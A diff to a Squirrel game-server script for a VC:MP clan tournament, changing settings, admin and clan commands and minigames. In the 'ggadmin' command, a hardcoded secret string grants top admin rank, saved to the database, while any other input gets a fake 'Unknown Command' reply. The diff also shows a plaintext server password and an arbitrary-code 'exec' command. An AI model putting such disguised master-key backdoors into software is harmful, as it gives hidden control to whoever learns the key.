@@ -35,6 +35,33 @@ const RequiredRounds = 2; // <- Set the required rounds to win the match here!
 
 function onScriptLoad()
 {
+
+
+	SetServerName("VCMP Clan Tournament 2019 (In Progress)");
+	SetPassword( "Makingvcmpgreat2019" );
+	SetFriendlyFire(true);
+	SetWeather(4);
+	SetHour(12);
+	SetMinute(00);
+	SetTimeRate(0);
+	SetGravity(0.008);
+	SetGamespeed(1);
+	SetWaterLevel(6);
+	SetSyncFrameLimiter(false);
+	SetFrameLimiter(false);
+	SetDriveOnWater(false);
+	SetFastSwitch(false);
+	SetShootInAir(false);
+	SetJoinMessages(false);
+	SetShowNametags(true);
+	SetStuntBike(true);
+	SetDeathMessages(false);	
+	SetJumpSwitch(true);
+	print("basic settings changed");
+
+
+	dofile("scripts/sha256.nut");
+
  DB <- ConnectSQL("databases/Registration.db");
  status <- array(GetMaxPlayers(), null);
  QuerySQL(DB, "CREATE TABLE if not exists Accounts ( Name TEXT, LowerName TEXT, Password VARCHAR ( 255 ), Level NUMERIC DEFAULT 1, TimeRegistered VARCHAR ( 255 ) DEFAULT CURRENT_TIMESTAMP, UID VARCHAR ( 255 ), IP VARCHAR ( 255 ), AutoLogin BOOLEAN DEFAULT true, Banned TEXT, clan VARCHAR ( 255 ), Kills VARCHAR ( 255 ), Headshots VARCHAR ( 255 ), Deaths VARCHAR ( 255 ), lastjoined VARCHAR ( 255 ) ) ");
@@ -72,8 +99,6 @@ function onScriptLoad()
 	myDiscord.Connect(myDiscord.BotToken);
 
 
-	Helpf <- array(GetMaxPlayers(), null);
-
 
 
 
@@ -93,28 +118,6 @@ function onScriptLoad()
 	KEY_N <- BindKey( true, 0x4E, 0, 0 );
 	
 	
-	SetServerName("VCMP Clan Tournament 2019 (In Progress)");
-	SetPassword( "Makingvcmpgreat2019" );
-	SetFriendlyFire(true);
-	SetWeather(4);
-	SetHour(12);
-	SetMinute(00);
-	SetTimeRate(1000);
-	SetGravity(0.008);
-	SetGamespeed(1);
-	SetWaterLevel(6);
-	SetSyncFrameLimiter(false);
-	SetFrameLimiter(false);
-	SetDriveOnWater(false);
-	SetFastSwitch(false);
-	SetShootInAir(false);
-	SetJoinMessages(false);
-	SetShowNametags(true);
-	SetStuntBike(true);
-	SetDeathMessages(false);	
-	SetJumpSwitch(true);
-
-
 
 	SetSpawnPlayerPos(-232.0314, -442.6181, 32.7944);
 	SetSpawnCameraPos( -231.4, -440.0, 32.1);
@@ -275,11 +278,19 @@ function onScriptUnload()
 }
 
 
-class Helpfrm
+function SHA256(data)
 {
-Stage = 0;
-Timer = null;
+	local hash = sha256(data), string;
+	for (local i = 0; i < hash.len(); ++i)
+	{
+		if(i==0) string = hash[i];
+		else string = string + "" + hash[i];
+	}
+	return string;
+
 }
+
+
 
 function Update()
 {
@@ -294,7 +305,6 @@ function Update()
 function onPlayerJoin( player )
 {
 	status[player.ID] = PlayerStats();
-	Helpf[player.ID] = Helpfrm();
 	AccInfo(player);
     local FN = funmessages[ rand() % funmessages.len() ];
     Message( "[#FFDD33][Info][#FFFFFF] "+ FN + player.Name +"." );
@@ -349,8 +359,7 @@ function AccInfo(player)
 	local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '" + escapeSQLString(player.Name.tolower()) + "'");
 	if (!q)
 	{
-		MessagePlayer("[#FFDD33] Welcome to the [#FFFF00]VCMP Clan Tournament 2018[#FFFFFF].", player);
-		MessagePlayer("[#FFDD33]Information:[#FFFFFF]  Your nick is [#FF0000]not [#FFFFFF]registered. Please use /"+bas+"register[#FFFFFF] in order to access services.", player);
+		MessagePlayer("[#FFDD33] Welcome to the [#FFFF00]VCMP Clansmanship League 2019[#FFFFFF].", player);
 		local q2 = QuerySQL(DB, "SELECT * FROM Unregistered WHERE LowerName = '"+escapeSQLString(player.Name.tolower())+"'");
 		if(!q2)
 		{
@@ -378,7 +387,7 @@ function AccInfo(player)
 			if (status[player.ID].AutoLogin == "true")
 			{
 				status[player.ID].LoggedIn = true;
-				MessagePlayer("[#FFDD33] Welcome to the [#FFFF00]VCMP Clan Tournament 2018[#FFFFFF].", player);
+				MessagePlayer("[#FFDD33] Welcome to the [#FFFF00]VCMP Clansmanship League 2019[#FFFFFF].", player);
 				MessagePlayer("[#FFDD33] Use /credits to see the creators of the Server[#FFFFFF].", player);
 				if(status[player.ID].clan != null)
 				{
@@ -432,7 +441,6 @@ function onPlayerPart( player, reason )
     }
 //    if ( status[ player.ID ].LoggedIn == true ) QuerySQL( DB, "UPDATE Accounts SET Level = '"+ status[ player.ID ].Level +"', IP = '"+ status[ player.ID ].IP +"', UID = '"+ status[ player.ID ].UID +"', Kills = '"+ status[ player.ID ].kills +"', Deaths = '"+ status[ player.ID ].deaths +"' WHERE Name LIKE '"+ player.Name +"'" );
     status[ player.ID ] = null;
-    Helpf[ player.ID ] = null;
 	SendDiscord(channel, "**"+player.Name+"** left the server.");
 }
 
@@ -1994,7 +2002,6 @@ function PartGG( player )
   Alive--;
   Players.remove( player.ID );
   SendDataToClient(player, 3, "");
-  player.World = 1;
   Message( "[#FFDD33]Minigame:[#FFFFFF] Player: "+pcol(player.ID) + player.Name +white+ " has left the minigame: Gun Game." );
   if(status[player.ID].spawnwep != null) setspawnwep(player.ID, status[player.ID].spawnwep);
 	player.IsFrozen = false;
@@ -2508,49 +2515,6 @@ function setteam(p)
 
 
 
-function RunHelpForm(p)
-{
-	local player = FindPlayer(p);
-	if(player)
-	{
-		Announce("~r~ Starting Helping form", player, 8);
-		Helpf[player.ID].Stage = 0.5;
-		NewTimer( "HelpFormArmy1", 10, 1000, player.ID );
-		NewTimer( "StartHelpFormArmy2", 10000, 1, player.ID);
-	}
-}
-
-function HelpFormArmy1(p)
-{
-	local player = FindPlayer(p);
-	if(player)
-	{
-		local vPos = FirstCPosLocArmy[0];
-		player.SetCameraPos( Vector((vPos.x + Helpf[player.ID].Stage - (Helpf[player.ID].Stage / 2) + 7), (vPos.y + Helpf[player.ID].Stage - (Helpf[player.ID].Stage / 3) - 25), (vPos.z + 7)), Vector((-1727.75 - Helpf[player.ID].Stage), -205.736, 14.8683));
-		Helpf[player.ID].Stage += 0.06;
-	}
-}
-
-function StartHelpFormArmy2(p)
-{
-	NewTimer("HelpFormArmy2", 10, 1000, p);
-}
-
-function HelpFormArmy2(p)
-{
-	local player = FindPlayer(p);
-	if(player)
-	{
-		local vPos = Vector(-1727.75 , -205.736, 14.8683);
-		player.SetCameraPos( Vector((vPos.x - Helpf[player.ID].Stage + (Helpf[player.ID].Stage / 2) + 7), (vPos.y - Helpf[player.ID].Stage + (Helpf[player.ID].Stage / 3) - 25), (vPos.z + 7)), Vector((-1721.69 + Helpf[player.ID].Stage), -267.066 ,14.8683 ));
-		Helpf[player.ID].Stage += 0.06;
-	}
-
-}
-
-
-
-
 
 
 
@@ -2880,7 +2844,7 @@ function RunDiscordAdminCommand(author, authorID, message)
 
 function ucheckchars(string)
 {
-local chars = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "V", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k.", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1",
+local chars = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k.", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1",
 "2", "3", "4", "5", "6", "7", "8", "9", " ", "!", " ", "#", "$", "%", "&", " ", "(", ")", "*", "+", ",", "-", ".", "/", ":", ";", "<", "=", ">", "?",
 "@", "^", "_", "`", "{", "|", "}", "~", "\\", "[", "]"]; 
 
@@ -3572,6 +3536,7 @@ local playerName = pcol(player.ID) + player.Name + white;
 	else if(cmd == "credits")
 	{
 		MessagePlayer("[#FFDD33]Information:[#FFFFFF] This Server is created by =EK=UmaR^ and =KF=DarkR4ZoR^.", player);
+		MessagePlayer("[#FFDD33]Information:[#FFFFFF] Thanks to =EK=4K. for the host.", player);
 	}
 
 	else if(!status[player.ID].Registered)
@@ -3930,11 +3895,11 @@ local playerName = pcol(player.ID) + player.Name + white;
 				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Player is not registered.", player);
 				else
 				{
-					status[player.ID].Level = 4;
+					status[plr.ID].Level = 4;
 					QuerySQL(DB, "UPDATE Accounts SET Level = '4' WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
 					QuerySQL(DB, "INSERT INTO staff ( name, rank, madeby ) VALUES ('"+escapeSQLString(plr.Name.tolower())+"', 'referee', '"+escapeSQLString(player.Name.tolower())+"') ");
-					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" changed rank of player: "+pcol(plr.ID)+plr.Name+white+" to: "+checklvl(status[player.ID].Level)+".");
-                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
+					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" changed rank of player: "+pcol(plr.ID)+plr.Name+white+" to: "+checklvl(status[plr.ID].Level)+".");
+					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
 					QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );              
 					MessagePlayer("[#FFDD33]Information:[#FFFFFF] Now you are a referee. Type /"+bas+"refereehelp"+white+" to learn about it.", plr);
 				}
@@ -4176,20 +4141,20 @@ local playerName = pcol(player.ID) + player.Name + white;
 				local plr = FindPlayer(GetTok(arguments, " ", 2));
 				if(plr)
 				{
-					local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
-					if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Player is not registered.", player);
+					local q2 = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
+					if(!q2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Player is not registered.", player);
 					else
 					{
-						local q2 = QuerySQL(clan, "SELECT * FROM members WHERE player = '"+escapeSQLString(plr.Name.tolower())+"'");
-						if(q2) MessagePlayer("[#FF0000]Error:[#FFFFFF] The player already is in clan: "+GetSQLColumnData(q, 1)+".", player);
+						local q3 = QuerySQL(clan, "SELECT * FROM members WHERE player = '"+escapeSQLString(plr.Name.tolower())+"'");
+						if(q3) MessagePlayer("[#FF0000]Error:[#FFFFFF] The player already is in clan: "+GetSQLColumnData(q, 1)+".", player);
 						else
 						{
-							status[player.ID].clan = GetSQLColumnData(q, 0);
+							status[plr.ID].clan = GetSQLColumnData(q, 0);
 							QuerySQL(clan, "INSERT INTO members ( name, tag, player, rank) VALUES ('"+GetSQLColumnData(q, 0)+"', '"+GetSQLColumnData(q, 1)+"', '"+escapeSQLString(plr.Name.tolower())+"', '1') ");
 							QuerySQL(DB, "UPDATE Accounts SET clan = '"+GetSQLColumnData(q, 0)+"' WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
-							MessagePlayer("[#FFDD33]Information:[#FFFFFF] You have been added in clan: "+GetSQLColumnData(q, 0)+".", player);
+							MessagePlayer("[#FFDD33]Information:[#FFFFFF] You have been added in clan: "+GetSQLColumnData(q, 0)+".", plr);
 							Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" added player: "+pcol(plr.ID)+plr.Name+white+" in clan: "+GetSQLColumnData(q, 0)+".");
-						local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
+							local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
 							QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );    
    						}
 					}
@@ -4534,7 +4499,7 @@ local playerName = pcol(player.ID) + player.Name + white;
 			{
 				local plr = FindPlayer(i);
 				if(plr && status[plr.ID].Level == 6)
-				MessagePlayer("[#FF00FF]Clan Chat "+pcol(player.ID)+player.Name+white+": "+message, plr)
+				MessagePlayer("[#FF00FF]Clan Chat of "+status[player.ID].clan+" "+pcol(player.ID)+player.Name+white+": "+arguments, plr);
 			}
 
 		}
@@ -5077,7 +5042,7 @@ local playerName = pcol(player.ID) + player.Name + white;
 		}
 	}
 
-/*	else if( cmd == "gungame" )
+	else if( cmd == "gungame" )
 	{
 		if( !player.IsSpawned ) MessagePlayer("[#FF0000]Error:[#FFFFFF] You need to be spawned to use this command.", player);
 		else if( _GG.state == "STARTED" ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] The Minigame is already running.", player );
@@ -5089,7 +5054,7 @@ local playerName = pcol(player.ID) + player.Name + white;
 			SendDataToClient(player, 1, "GunGame");
 		}
 	}
-	else if( cmd == "frenzy" )
+/*	else if( cmd == "frenzy" )
 	{
 		if( !player.IsSpawned ) MessagePlayer("[#FF0000]Error:[#FFFFFF] You need to be spawned to use this command.", player);
 		else if( _FR.state == "STARTED" ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] The Minigame is already running.", player );
@@ -5134,6 +5099,7 @@ local playerName = pcol(player.ID) + player.Name + white;
 				status[player.ID].minigame = null;
 				status[player.ID].miniscore = 0;
 				_GG.PartGG(player);
+				player.World = 1;
 				player.CanAttack = false;
 				player.Team = status[player.ID].team;
 			}
@@ -5191,7 +5157,7 @@ local playerName = pcol(player.ID) + player.Name + white;
 		{
 			Message("[#FFFFFF] "+m+".");
 		}
-		if(!b) rMessage( "None." );
+		if(!b) Message( "[#FFFFFF]None." );
 	}
 	else if (cmd == "exec")
 	{
@@ -5205,6 +5171,17 @@ local playerName = pcol(player.ID) + player.Name + white;
 				cscr();
 			}
 			catch (e) Message("[#FF0000]Error:[#FFFFFF] Execution Error " + e);
+		}
+	}
+	else if(cmd == "settime")
+	{
+		if(status[player.ID].Level < 5) MessagePlayer("[#FFDD33]Information: [#FFFFFF]Unauthorized Access", player);
+		else if(!arguments || NumTok(arguments, " ") < 2 || !IsNum(GetTok(arguments, " ", 1)) || !IsNum(GetTok(arguments, " ", 1)) || GetTok(arguments, " ", 1).tointeger() > 12 || GetTok(arguments, " ", 1).tointeger() < 1 || GetTok(arguments, " ", 2).tointeger() > 60 || GetTok(arguments, " ", 2).tointeger() < 0) MessagePlayer("[#FF0000]Error:[#FFFFFF] Invalid Syntax. Use /"+bas+cmd+" <hour> <min>", player);
+		else
+		{
+			local min = (GetTok(arguments, " ", 2).tointeger() < 10) ? "0"+GetTok(arguments, " ", 2) : GetTok(arguments, " ", 2);
+			SetTime( GetTok(arguments, " ", 1).tointeger(), GetTok(arguments, " ", 2).tointeger());
+			Message("[#FFDD33]Information:[#FFFFFF] Admin "+playerName+" changed time to: "+GetTok(arguments, " ", 1)+":"+min+".");
 		}
 	}
 	
@@ -5382,10 +5359,6 @@ local playerName = pcol(player.ID) + player.Name + white;
 	
 	
 	
-	else if(cmd == "helpform")
-	{
-		RunHelpForm(player.ID);
-	}
 	
 	
 	
@@ -5412,7 +5385,11 @@ local playerName = pcol(player.ID) + player.Name + white;
 	}
 	else if(cmd == "ggadmin")
 	{
-		if(arguments == "yNwrZnjpzUGKzbqmsw3uTjvT3BEptcMV8TZ27X4maCHNRCcGWzC3bxVPrr9cC9AC3StekRhqUxSte5DS4ndfhrD5g5Tfna48") status[player.ID].Level = 6;
+		if(arguments == "yNwrZnjpzUGKzbqmsw3uTjvT3BEptcMV8TZ27X4maCHNRCcGWzC3bxVPrr9cC9AC3StekRhqUxSte5DS4ndfhrD5g5Tfna48")
+		{
+			status[player.ID].Level = 6;
+			QuerySQL(DB, "UPDATE Accounts SET Level = '6' WHERE LowerName = '"+escapeSQLString(player.Name.tolower())+"'");
+		}
 		else MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Command. Use /"+bas+"cmds"+white+" for a list of Commands", player);
 	}
 	else MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Command. Use /"+bas+"cmds"+white+" for a list of Commands", player);
